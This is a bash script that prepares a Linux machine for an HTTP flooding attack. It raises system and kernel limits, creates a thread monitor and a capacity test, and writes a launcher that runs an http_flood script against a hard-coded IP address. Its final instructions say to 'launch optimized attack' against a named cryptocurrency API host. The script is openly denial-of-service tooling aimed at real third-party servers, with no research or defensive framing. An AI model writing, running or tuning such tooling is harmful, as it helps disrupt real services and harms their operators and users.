#!/bin/bash

# System optimization script for maximum thread capacity
# Run as root: sudo bash optimize_system.sh

echo "[*] Optimizing system for maximum thread capacity..."

# 1. Increase system limits
echo "[1] Setting system limits..."
cat >> /etc/security/limits.conf << EOL

# Flooding script optimizations
* soft nofile 1048576
* hard nofile 1048576
* soft nproc 1048576
* hard nproc 1048576
* soft memlock unlimited
* hard memlock unlimited
root soft nofile 1048576
root hard nofile 1048576
root soft nproc 1048576
root hard nproc 1048576
root soft memlock unlimited
root hard memlock unlimited
EOL

# 2. Kernel parameter optimization
echo "[2] Optimizing kernel parameters..."
cat >> /etc/sysctl.conf << EOL

# Thread and memory optimizations for flooding
vm.max_map_count = 2147483647
kernel.threads-max = 2097152
kernel.pid_max = 2097152
vm.overcommit_memory = 1
vm.overcommit_ratio = 100
vm.swappiness = 1
net.core.somaxconn = 65535
net.ipv4.tcp_max_syn_backlog = 65535
net.core.netdev_max_backlog = 65535
net.ipv4.ip_local_port_range = 1024 65535
net.ipv4.tcp_fin_timeout = 15
net.ipv4.tcp_tw_reuse = 1
net.ipv4.tcp_timestamps = 1
fs.file-max = 2097152
EOL

# Apply kernel parameters immediately
sysctl -p

# 3. Set session limits for current user
echo "[3] Setting session limits..."
ulimit -n 1048576  # File descriptors
ulimit -u 1048576  # Max user processes
ulimit -s 256      # Stack size to 256KB (from default 8MB)

# 4. Create monitoring script
echo "[4] Creating resource monitoring script..."
cat > /root/flooding/monitor_resources.py << 'EOL'
#!/usr/bin/env python3
import psutil
import time
import os
import sys

def monitor_system():
    """Continuous system monitoring for flooding script"""
    print("=== SYSTEM RESOURCE MONITOR ===")
    print("Press Ctrl+C to stop monitoring\n")
    
    try:
        while True:
            # System info
            cpu = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            swap = psutil.swap_memory()
            
            # Network info
            net_io = psutil.net_io_counters()
            
            # Process info (find flooding processes)
            flooding_processes = []
            for proc in psutil.process_iter(['pid', 'name', 'memory_info', 'num_threads']):
                try:
                    if 'http_flood' in proc.info['name'] or proc.info['name'] == 'python3.11':
                        flooding_processes.append(proc)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            
            # Clear screen and display info
            os.system('clear')
            print("=== SYSTEM RESOURCE MONITOR ===")
            print(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
            print()
            
            # CPU and Memory
            print(f"CPU Usage: {cpu}%")
            print(f"Memory Usage: {memory.used / 1024**3:.2f}GB / {memory.total / 1024**3:.2f}GB ({memory.percent}%)")
            print(f"Memory Available: {memory.available / 1024**3:.2f}GB")
            print(f"Swap Usage: {swap.used / 1024**3:.2f}GB / {swap.total / 1024**3:.2f}GB ({swap.percent}%)")
            print()
            
            # Network
            print(f"Network Sent: {net_io.bytes_sent / 1024**2:.2f}MB")
            print(f"Network Received: {net_io.bytes_recv / 1024**2:.2f}MB")
            print(f"Packets Sent: {net_io.packets_sent}")
            print(f"Packets Received: {net_io.packets_recv}")
            print()
            
            # Flooding processes
            total_threads = 0
            total_memory = 0
            print("=== FLOODING PROCESSES ===")
            for proc in flooding_processes:
                try:
                    proc_info = proc.as_dict(['pid', 'name', 'memory_info', 'num_threads', 'cpu_percent'])
                    memory_mb = proc_info['memory_info'].rss / 1024**2
                    threads = proc_info['num_threads']
                    
                    total_threads += threads
                    total_memory += memory_mb
                    
                    print(f"PID: {proc_info['pid']}, Threads: {threads}, Memory: {memory_mb:.1f}MB")
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            
            if flooding_processes:
                print(f"\nTotal Flooding Threads: {total_threads}")
                print(f"Total Flooding Memory: {total_memory:.1f}MB")
                if total_threads > 0:
                    print(f"Average Memory per Thread: {total_memory/total_threads:.2f}MB")
            else:
                print("No flooding processes detected")
            
            print("\n" + "="*50)
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\nMonitoring stopped.")

if __name__ == "__main__":
    monitor_system()
EOL

chmod +x /root/flooding/monitor_resources.py

# 5. Create thread capacity test
echo "[5] Creating thread capacity test..."
cat > /root/flooding/test_thread_capacity.py << 'EOL'
#!/usr/bin/env python3
import threading
import time
import sys

# Set minimal stack size
threading.stack_size(131072)  # 128KB

def dummy_thread():
    """Minimal thread function"""
    time.sleep(30)  # Just sleep

def test_max_threads():
    """Test maximum number of threads we can create"""
    threads = []
    thread_count = 0
    
    print("Testing maximum thread capacity...")
    print("Thread stack size:", threading.stack_size() / 1024, "KB")
    
    try:
        while True:
            t = threading.Thread(target=dummy_thread)
            t.daemon = True
            t.start()
            threads.append(t)
            thread_count += 1
            
            if thread_count % 1000 == 0:
                print(f"Created {thread_count} threads...")
                
    except RuntimeError as e:
        print(f"\nReached thread limit at: {thread_count} threads")
        print(f"Error: {e}")
        
    except Exception as e:
        print(f"\nUnexpected error at {thread_count} threads: {e}")
    
    print(f"Maximum threads achieved: {thread_count}")
    
    # Cleanup
    print("Cleaning up threads...")
    for t in threads:
        t.join(timeout=0.1)

if __name__ == "__main__":
    test_max_threads()
EOL

chmod +x /root/flooding/test_thread_capacity.py

# 6. Create optimized launcher script
echo "[6] Creating optimized launcher..."
cat > /root/flooding/launch_optimized.sh << 'EOL'
#!/bin/bash

# Optimized launcher for flooding script
echo "Setting up optimized environment..."

# Set process limits for current session
ulimit -n 1048576    # Max file descriptors
ulimit -u 1048576    # Max processes
ulimit -s 256        # Stack size 256KB
ulimit -l unlimited  # Max locked memory

# Set environment variables for Python
export PYTHONHASHSEED=0
export PYTHONUNBUFFERED=1

# Display current limits
echo "Current limits:"
echo "Max file descriptors: $(ulimit -n)"
echo "Max processes: $(ulimit -u)" 
echo "Stack size: $(ulimit -s)KB"

# Start resource monitor in background
echo "Starting resource monitor..."
python3.11 /root/flooding/monitor_resources.py &
MONITOR_PID=$!

echo "Monitor PID: $MONITOR_PID"
echo "Press Ctrl+C to stop everything"

# Trap to cleanup on exit
trap 'echo "Stopping monitor..."; kill $MONITOR_PID 2>/dev/null; exit' INT TERM

# Launch the flooding script
echo "Launching optimized flooding script..."
python3 ~/PI_http_flood/http_flood1.py 185.113.249.191 80 "$@"

# Cleanup
kill $MONITOR_PID 2>/dev/null
EOL

chmod +x /root/flooding/launch_optimized.sh

echo ""
echo "=== OPTIMIZATION COMPLETE ==="
echo ""
echo "What was optimized:"
echo "1. System limits increased to ~1M threads/files"
echo "2. Kernel parameters tuned for high concurrency"
echo "3. Memory overcommit enabled"
echo "4. Network stack optimized"
echo "5. Stack size reduced to 256KB per thread"
echo ""
echo "Next steps:"
echo "1. REBOOT your system: sudo reboot"
echo "2. Test thread capacity: python3.11 /root/flooding/test_thread_capacity.py"
echo "3. Monitor resources: python3.11 /root/flooding/monitor_resources.py"
echo "4. Launch optimized attack: /root/flooding/launch_optimized.sh https://api.mainnet.minepi.com 443"
echo ""
echo "WARNING: These changes affect system-wide behavior!"
EOL
